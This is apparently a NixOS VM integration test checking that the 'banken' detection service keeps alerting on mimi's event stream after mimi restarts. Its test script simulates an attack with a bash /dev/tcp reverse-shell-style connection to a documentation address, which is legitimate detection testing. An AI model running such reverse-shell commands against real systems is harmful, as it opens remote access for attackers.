# Reproduces the deployed failure's mechanism: banken keeps running while mimi.service RESTARTS
# (the fix deploy swapped mimi's binary and restarted it, but left banken running from the earlier
# deploy). banken must re-attach to mimi's stream after the restart and still alert on a
# reverse-shell exec that happens afterwards. If banken's inotify watch is orphaned by the restart,
# this fails -- which is the live symptom.
{ pkgs, banken, mimiModule }:
pkgs.testers.runNixOSTest {
  name = "banken-mimi-restart";
  nodes.machine = {
    imports = [ ../module.nix mimiModule ];
    services.banken = {
      enable = true;
      package = banken;
      alerts.jsonl = { enable = true; format = "ocsf"; };
      mimi.enable = true;
    };
    users.users.alice.isNormalUser = true;
    environment.systemPackages = [ pkgs.python3 ];
    virtualisation.memorySize = 2048;
  };
  testScript = ''
    import time
    machine.wait_for_unit("mimi.service")
    machine.wait_for_unit("banken.service")
    machine.wait_for_file("/var/log/mimi/events.jsonl")
    machine.wait_until_succeeds("test -s /var/log/mimi/events.jsonl")

    # banken is now following the original mimi. Restart mimi (recreates its DynamicUser runtime,
    # rewrites the sink), exactly like the deploy that swapped the binary under a running banken.
    machine.succeed("systemctl restart mimi.service")
    machine.wait_for_unit("mimi.service")
    machine.wait_until_succeeds("test -s /var/log/mimi/events.jsonl")
    machine.sleep(2)

    # A reverse-shell exec AFTER the restart. banken must still alert on it off the mimi stream.
    port = "47123"
    machine.succeed(
        f"(runuser -u alice -- timeout 3 bash -c 'exec 3<>/dev/tcp/192.0.2.1/{port}' >/dev/null 2>&1 &) ; true"
    )
    hit = False
    for _ in range(50):  # up to ~25s
        out = machine.execute(
            f"grep {port} /var/log/banken/alerts-*.jsonl 2>/dev/null | grep '\"data_sources\":\\[\"mimi\"\\]' || true"
        )[1]
        if out.strip():
            hit = True
            break
        time.sleep(0.5)

    print("=== mimi captured after restart? ===\n" + machine.execute(f"grep -c {port} /var/log/mimi/events.jsonl")[1])
    print("=== banken journal ===\n" + machine.execute("journalctl -u banken.service --no-pager | grep -iE 'follow|stream|mimi|error' | tail -12")[1])
    assert hit, "banken did NOT alert on a mimi event after mimi restarted (orphaned watch reproduced)"
    print("RESTART PASS: banken re-attached to mimi's stream after a mimi restart")
  '';
}
